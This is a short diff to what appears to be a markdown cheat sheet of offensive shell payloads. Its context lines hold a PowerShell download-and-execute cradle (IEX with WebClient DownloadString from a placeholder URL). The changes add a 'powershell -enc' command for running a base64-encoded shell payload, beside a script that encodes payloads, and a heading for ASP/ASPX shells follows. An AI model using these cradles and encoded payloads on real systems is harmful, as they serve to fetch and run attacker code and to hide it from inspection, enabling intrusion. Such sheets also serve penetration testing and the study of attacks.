@@ -18,8 +18,9 @@ powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<
 ```
 
 ###### Base64 Encode
-Powershell Script
+
 ```
+#PowerShell Script
 $Text = "YOUR_PAYLOAD_HERE"
 
 $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
@@ -27,6 +28,9 @@ $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
 $EncodedText =[Convert]::ToBase64String($Bytes)
 
 $EncodedText
+
+#PowerShell Command
+powershell -enc "<base64_shell_payload>"
 ```
 
 ##### ASP / ASPX
